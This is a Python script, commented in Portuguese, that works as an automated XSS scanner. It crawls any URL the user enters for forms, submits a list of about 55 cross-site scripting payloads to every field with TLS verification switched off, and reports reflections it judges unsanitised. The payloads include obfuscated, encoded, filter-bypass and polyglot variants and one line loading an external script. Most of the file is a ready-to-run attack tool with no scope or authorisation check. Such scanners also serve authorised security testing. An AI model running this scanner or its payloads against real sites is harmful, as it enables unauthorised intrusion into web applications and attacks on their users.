import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import textwrap
import re
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed

# Desativar avisos SSL (apenas para desenvolvimento/testes!)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Códigos de cores ANSI
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
MAGENTA = "\033[95m"
BLUE = "\033[94m"
WHITE = "\033[97m"
RESET = "\033[0m"

# Configuração de exibição
LINE_LENGTH = 80
SECTION_CHAR = "="
SUBSECTION_CHAR = "-"

# Lista de payloads XSS otimizada
payloads = [
    # Payloads básicos
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "'><script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "<body onload=alert(1)>",
    "<iframe src=\"javascript:alert(1)\">",
    
    # Payloads ofuscados
    "<script>eval('al'+'ert(1)')</script>",
    "<a href=\"javas&#99;ript:alert(1)\">XSS</a>",
    "<img src=\"x\" onerror=\"&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;\">",
    "<script>window['al'+'ert'](1)</script>",
    
    # Payloads avançados
    "<script>Function('ale'+'rt(1)')()</script>",
    "<script>setTimeout('alert(1)',0)</script>",
    "<script>setInterval('alert(1)',1000)</script>",
    "<script>new Function`alert\\`1\\``</script>",
    
    # Payloads codificados
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "javascript:alert(1)",
    "jav&#x09;ascript:alert(1)",
    "jav&#x0A;ascript:alert(1)",
    "jav&#x0D;ascript:alert(1)",
    
    # Payloads de eventos HTML
    "<img src=x onerror=alert`1`>",
    "<img src=x onerror='alert(1)'>",
    "<img src=x oneonerrorrror=alert(1)>",
    "<img src=x:alert(1)// onerror=eval(src)>",
    "<img src=\"x:alert(1)//\" onerror=eval(src)>",
    
    # Payloads de template
    "${alert(1)}",
    "#{alert(1)}",
    "{{alert(1)}}",
    "<%= alert(1) %>",
    
    # Payloads de SVG
    "<svg><script>alert(1)</script>",
    "<svg><script>alert&#40;1&#41</script>",
    "<svg><script>alert&#40;1&#41</script>",
    "<svg><script>javascript:alert(1)</script>",
    
    # Payloads de marcação
    "<mark onmouseover=alert(1)>Passe o mouse</mark>",
    "<details open ontoggle=alert(1)>",
    "<div onpointerover=alert(1)>Clique aqui</div>",
    
    # Payloads com caracteres especiais
    "<script>alert(1)//\\</script>",
    "<script src=data:,alert(1)>",
    "<script src=//example.com/xss.js>",
    
    # Payloads de redirecionamento
    "<script>location.href='javascript:alert(1)'</script>",
    "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">",
    
    # Payloads para filtros específicos
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<<script>script>alert(1)<</script>/script>",
    "<img src=\"x\" onerror=alert`1` //",
    
    # Payloads para DOM XSS
    "\" onfocus=alert(1) autofocus=\"",
    "' onmouseover=alert(1) style='display:block;width:100%;height:100%'",
    "</script><script>alert(1)</script>",
    
    # Payloads para aplicações React/Angular
    "{alert(1)}",
    "{{constructor.constructor('alert(1)')()}}",
    "[{toString:alert,0:1}]",
    
    # Payloads polyglots (funcionam em múltiplos contextos)
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(alert(1))//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e",
    "\"'-->'</script><script>alert(1)</script>",
]

def imprimir_cabecalho(titulo):
    print(f"\n{CYAN}{SECTION_CHAR * LINE_LENGTH}{RESET}")
    print(f"{CYAN}{titulo.center(LINE_LENGTH)}{RESET}")
    print(f"{CYAN}{SECTION_CHAR * LINE_LENGTH}{RESET}")

def imprimir_subcabecalho(titulo, color=CYAN):
    print(f"\n{color}{SUBSECTION_CHAR * LINE_LENGTH}{RESET}")
    print(f"{color}{titulo.center(LINE_LENGTH)}{RESET}")
    print(f"{color}{SUBSECTION_CHAR * LINE_LENGTH}{RESET}")

def imprimir_info(mensagem, prefixo=""):
    linhas = textwrap.wrap(mensagem, width=LINE_LENGTH - len(prefixo))
    for linha in linhas:
        print(f"{WHITE}{prefixo}{linha}{RESET}")

def imprimir_sucesso(mensagem):
    print(f"{GREEN}[+] {mensagem}{RESET}")

def imprimir_aviso(mensagem):
    print(f"{YELLOW}[!] {mensagem}{RESET}")

def imprimir_erro(mensagem):
    print(f"{RED}[-] {mensagem}{RESET}")

def imprimir_vulnerabilidade(mensagem):
    print(f"{RED}{mensagem}{RESET}")

def encontrar_formularios(url):
    imprimir_cabecalho("PROCURANDO FORMULÁRIOS")
    imprimir_info(f"Analisando URL: {url}")
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (XSS Scanner)',
            'Accept': 'text/html,application/xhtml+xml'
        }
        res = requests.get(url, headers=headers, timeout=10, verify=False)
        res.raise_for_status()
        
        soup = BeautifulSoup(res.content, "html.parser")
        forms = soup.find_all("form")
        
        if forms:
            imprimir_sucesso(f"Encontrado(s) {len(forms)} formulário(s)")
        else:
            imprimir_aviso("Nenhum formulário encontrado")
        return forms
        
    except requests.RequestException as e:
        imprimir_erro(f"Erro ao acessar URL: {e}")
        return []

def obter_dados_formulario(form):
    dados = {}
    action = form.get("action")
    method = form.get("method", "get").lower()
    
    inputs = form.find_all(["input", "textarea", "select"])
    for input_tag in inputs:
        name = input_tag.get("name")
        if name:
            value = input_tag.get("value", "")
            dados[name] = value
            
    return action, method, dados

def verificar_reflexao_contexto(response, payload):
    soup = BeautifulSoup(response.text, 'html.parser')
    
    # Verificar em tags script
    scripts = soup.find_all('script', string=lambda t: payload in str(t))
    if scripts:
        return True
    
    # Verificar manipuladores de eventos
    event_handlers = [
        'onload', 'onerror', 'onclick', 
        'onmouseover', 'onfocus', 'onsubmit',
        'onchange', 'onkeydown', 'onkeypress',
        'onkeyup', 'onmouseout', 'onmouseenter'
    ]
    
    for tag in soup.find_all():
        for attr in tag.attrs:
            if attr.lower() in event_handlers:
                if payload in str(tag[attr]):
                    return True
            if payload in str(tag.get(attr, '')):
                if any(c in str(tag.get(attr, '')) for c in ['<', '>', '"', "'"]):
                    return True
    
    # Verificar em href/javascript
    links = soup.find_all('a', href=lambda x: x and 'javascript:' in x and payload in x)
    if links:
        return True
    
    # Verificar caracteres perigosos não codificados
    if any(c in response.text for c in ['<', '>', '"', "'"]) and payload in response.text:
        return True
        
    return False

def verificar_sanitizacao(response, payload):
    caracteres_perigosos = ['<', '>', '"', "'", '&', '/']
    caracteres_sanitizados = ['&lt;', '&gt;', '&quot;', '&#39;', '&amp;', '&#x2F;']
    
    for i, char in enumerate(caracteres_perigosos):
        if char in payload:
            if char in response.text:
                if caracteres_sanitizados[i] not in response.text:
                    return False
            else:
                return True
                
    return True

def testar_payload(url_destino, method, dados, nome_payload, payload):
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (XSS Scanner)',
            'X-Scanner': 'XSS-Detector/1.0'
        }
        
        dados_teste = {k: payload for k in dados}
        
        if method == "post":
            res = requests.post(url_destino, data=dados_teste, 
                              headers=headers, timeout=15, verify=False)
        else:
            res = requests.get(url_destino, params=dados_teste,
                             headers=headers, timeout=15, verify=False)
        
        resultado = {
            'payload': payload,
            'nome_payload': nome_payload,
            'url': res.url,
            'status': res.status_code,
            'method': method.upper(),
            'refletido': payload in res.text,
            'contexto': False,
            'sanitizado': False
        }
        
        if resultado['refletido']:
            resultado['sanitizado'] = verificar_sanitizacao(res, payload)
            if not resultado['sanitizado']:
                resultado['contexto'] = verificar_reflexao_contexto(res, payload)
        
        return resultado
        
    except requests.RequestException as e:
        imprimir_erro(f"Erro na requisição para {nome_payload}: {e}")
        return None

def testar_xss(url):
    formularios = encontrar_formularios(url)
    if not formularios:
        return []

    todas_vulnerabilidades = []
    
    for i, form in enumerate(formularios, start=1):
        imprimir_cabecalho(f"TESTANDO FORMULÁRIO {i}/{len(formularios)}")
        action, method, dados = obter_dados_formulario(form)
        url_destino = urljoin(url, action)

        imprimir_info(f"URL do formulário: {url_destino}")
        imprimir_info(f"Método: {method.upper()}")
        imprimir_info(f"Campos: {', '.join(dados.keys()) if dados else 'Nenhum'}")
        
        imprimir_subcabecalho("INICIANDO TESTES XSS", MAGENTA)
        imprimir_info(f"Total de payloads para testar: {len(payloads)}")

        vulnerabilidades = []
        
        # Usando ThreadPoolExecutor para varredura mais rápida
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = {
                executor.submit(
                    testar_payload, 
                    url_destino, 
                    method, 
                    dados, 
                    f"Payload {j+1}", 
                    payload
                ): (j, payload) 
                for j, payload in enumerate(payloads)
            }
            
            for future in as_completed(futures):
                j, payload = futures[future]
                try:
                    resultado = future.result()
                    if resultado:
                        print(f"\n{BLUE}[Teste {j+1}/{len(payloads)}]{RESET}")
                        print(f"{YELLOW}Payload:{RESET} {payload}")
                        
                        if resultado['refletido']:
                            if resultado['sanitizado']:
                                print(f"{GREEN}Payload detectado mas sanitizado{RESET}")
                            elif resultado['contexto']:
                                msg = "Vulnerabilidade XSS confirmada!"
                                imprimir_vulnerabilidade(msg)
                                vulnerabilidades.append(resultado)
                            else:
                                print(f"{YELLOW}Payload refletido mas sem contexto de execução{RESET}")
                        else:
                            print(f"{GREEN}Nenhuma reflexão detectada{RESET}")
                            
                except Exception as e:
                    imprimir_erro(f"Erro processando payload {j+1}: {e}")
        
        if vulnerabilidades:
            imprimir_cabecalho("RELATÓRIO DE VULNERABILIDADES")
            for vuln in vulnerabilidades:
                print(f"\n{RED}=== Vulnerabilidade XSS ==={RESET}")
                print(f"{WHITE}Payload: {RED}{vuln['payload']}{RESET}")
                print(f"{WHITE}Método: {vuln['method']}")
                print(f"{WHITE}URL: {vuln['url']}")
                print(f"{WHITE}Status: {vuln['status']}")
                
            todas_vulnerabilidades.extend(vulnerabilidades)
    
    return todas_vulnerabilidades

if __name__ == "__main__":
    imprimir_cabecalho("SCANNER XSS AVANÇADO")
    url = input(f"{CYAN}Digite a URL para escanear XSS:{RESET} ").strip()
    
    if not url.startswith(('http://', 'https://')):
        url = f"https://{url}"
    
    vulnerabilidades = testar_xss(url)
    
    if vulnerabilidades:
        imprimir_cabecalho("RESUMO DA VERIFICAÇÃO")
        print(f"\n{RED}Encontradas {len(vulnerabilidades)} possíveis vulnerabilidades XSS{RESET}")
        for i, vuln in enumerate(vulnerabilidades, 1):
            print(f"\n{WHITE}{i}. {vuln['payload']}")
            print(f"   URL: {vuln['url']}")
    else:
        imprimir_sucesso("\nNenhuma vulnerabilidade XSS encontrada")
    
    imprimir_cabecalho("VERIFICAÇÃO CONCLUÍDA")